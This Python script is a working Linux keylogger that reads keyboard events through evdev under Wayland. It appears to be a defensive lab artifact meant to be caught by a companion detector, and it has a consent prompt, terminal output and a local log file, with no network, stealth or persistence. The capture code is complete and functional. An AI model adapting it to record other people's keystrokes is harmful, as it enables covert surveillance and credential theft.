#!/usr/bin/env python3
"""
LAB KEYLOGGER (overt / consented) — evdev backend for Wayland sessions.

Purpose
-------
Defensive-security lab artifact. It captures keystrokes by reading the Linux
kernel input layer (/dev/input/event*) via evdev, which works under Wayland
(unlike X11-based tools such as pynput). It is INTENTIONALLY loud and visible:

  * prints a consent banner and waits for confirmation,
  * writes to an obvious log file (lab_keystrokes.log),
  * announces itself to the terminal.

It is meant to be DETECTED by a companion detector agent. It performs NO
stealth, NO hiding, NO network exfiltration, NO persistence.

Use ONLY on a machine you own, logging ONLY your own keystrokes, in a lab.

Requirements
------------
  * Linux with evdev devices under /dev/input
  * Read access to /dev/input/event*  (run with sudo, or be in the 'input' group)
  * python-evdev  (pip install evdev)

Usage
-----
  sudo .venv/bin/python keylogger_evdev.py
  # Ctrl+C to stop.
"""

import sys
import os
import signal
from datetime import datetime
from pathlib import Path

try:
    from evdev import InputDevice, categorize, ecodes, list_devices
except ImportError:
    print("Missing dependency: evdev  ->  pip install evdev", file=sys.stderr)
    sys.exit(1)

LOG_FILE = Path(__file__).resolve().parent / "lab_keystrokes.log"

# Map evdev KEY_* names to readable tokens. evdev gives names like 'KEY_A'.
MODIFIERS = {
    "KEY_LEFTSHIFT": "LSHIFT", "KEY_RIGHTSHIFT": "RSHIFT",
    "KEY_LEFTCTRL": "LCTRL", "KEY_RIGHTCTRL": "RCTRL",
    "KEY_LEFTALT": "LALT", "KEY_RIGHTALT": "RALT",
    "KEY_LEFTMETA": "LSUPER", "KEY_RIGHTMETA": "RSUPER",
}
SPECIAL = {
    "KEY_SPACE": "SPACE", "KEY_ENTER": "ENTER", "KEY_TAB": "TAB",
    "KEY_BACKSPACE": "BACKSPACE", "KEY_ESC": "ESC", "KEY_CAPSLOCK": "CAPSLOCK",
    "KEY_UP": "UP", "KEY_DOWN": "DOWN", "KEY_LEFT": "LEFT", "KEY_RIGHT": "RIGHT",
}


def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def readable(keyname):
    if keyname in MODIFIERS:
        return f"<{MODIFIERS[keyname]}>"
    if keyname in SPECIAL:
        return f"<{SPECIAL[keyname]}>"
    if keyname.startswith("KEY_"):
        token = keyname[4:]
        # single letters/digits -> as-is, otherwise wrap for clarity
        return token if len(token) == 1 else f"<{token}>"
    return keyname


ALPHABET = [getattr(ecodes, f"KEY_{c}") for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"]
POINTER_BTNS = {ecodes.BTN_LEFT, ecodes.BTN_RIGHT, ecodes.BTN_MIDDLE,
                ecodes.BTN_TOUCH, ecodes.BTN_TOOL_PEN}


def keyboard_score(dev):
    """
    Return an integer score: how 'keyboard-like' a device is, or -1 to reject.

    A real text keyboard exposes the full alphabet plus SPACE/ENTER. Pointer
    devices (mice, tablets like the XP-Pen) are rejected even if they expose a
    few KEY_* codes, because they also expose relative axes or mouse buttons.
    """
    caps = dev.capabilities()
    keys = set(caps.get(ecodes.EV_KEY, []))

    # Reject pointers: relative axes (EV_REL) or mouse/pen buttons.
    if ecodes.EV_REL in caps:
        return -1
    if keys & POINTER_BTNS:
        return -1

    # Must look like a text keyboard.
    if not all(k in keys for k in ALPHABET):
        return -1
    if ecodes.KEY_SPACE not in keys or ecodes.KEY_ENTER not in keys:
        return -1

    return len(keys)  # richer keymap wins among real keyboards


def pick_keyboard(forced_path=None):
    """Pick the best keyboard device, or a specific one if forced_path is set."""
    if forced_path:
        return InputDevice(forced_path)

    best, best_score = None, -1
    for path in list_devices():
        try:
            dev = InputDevice(path)
        except PermissionError:
            continue
        score = keyboard_score(dev)
        if score > best_score:
            best, best_score = dev, score
    return best


def list_candidates():
    print("Input devices (score: higher = more keyboard-like, -1 = rejected):")
    for path in list_devices():
        try:
            dev = InputDevice(path)
        except PermissionError:
            print(f"  {path:24} (permission denied)")
            continue
        print(f"  {path:24} score={keyboard_score(dev):>4}  {dev.name}")


def consent_banner(dev):
    print("=" * 64, flush=True)
    print("  LAB KEYLOGGER — OVERT / CONSENTED ARTIFACT", flush=True)
    print("=" * 64, flush=True)
    print(f"  Device : {dev.path}  ({dev.name})", flush=True)
    print(f"  Log    : {LOG_FILE}", flush=True)
    print("  This records YOUR keystrokes on THIS machine for a security lab.", flush=True)
    print("  No stealth, no network, no persistence. Ctrl+C to stop.", flush=True)
    print("=" * 64, flush=True)
    reply = input("  Type 'I CONSENT' to start: ").strip()
    if reply != "I CONSENT":
        print("Consent not given. Exiting.", flush=True)
        sys.exit(0)


def write_log(line):
    with LOG_FILE.open("a", encoding="utf-8") as f:
        f.write(line + "\n")


def main():
    args = sys.argv[1:]
    if "--list" in args:
        list_candidates()
        sys.exit(0)

    forced_path = None
    if "--device" in args:
        forced_path = args[args.index("--device") + 1]

    if os.geteuid() != 0:
        print("Note: not running as root. If you see a PermissionError,", flush=True)
        print("re-run with sudo or add your user to the 'input' group.", flush=True)

    dev = pick_keyboard(forced_path)
    if dev is None:
        print("No readable keyboard device found under /dev/input.", file=sys.stderr)
        print("Run with sudo, or join the 'input' group.", file=sys.stderr)
        sys.exit(1)

    consent_banner(dev)

    header = f"{timestamp()} === lab keylogger started on {dev.path} ({dev.name}) ==="
    print(header, flush=True)
    write_log(header)

    def stop(signum, frame):
        msg = f"{timestamp()} === lab keylogger stopped ==="
        print("\n" + msg, flush=True)
        write_log(msg)
        sys.exit(0)

    signal.signal(signal.SIGINT, stop)
    signal.signal(signal.SIGTERM, stop)

    try:
        for event in dev.read_loop():
            if event.type != ecodes.EV_KEY:
                continue
            data = categorize(event)
            # keystate: 1 = down, 2 = hold, 0 = up. Log key-down only.
            if data.keystate != data.key_down:
                continue
            keyname = data.keycode
            if isinstance(keyname, (list, tuple)):
                keyname = keyname[0]
            token = readable(keyname)
            line = f"{timestamp()} PRESS {token}"
            print(line, flush=True)
            write_log(line)
    except PermissionError:
        print("PermissionError reading device. Run with sudo or join 'input' group.",
              file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
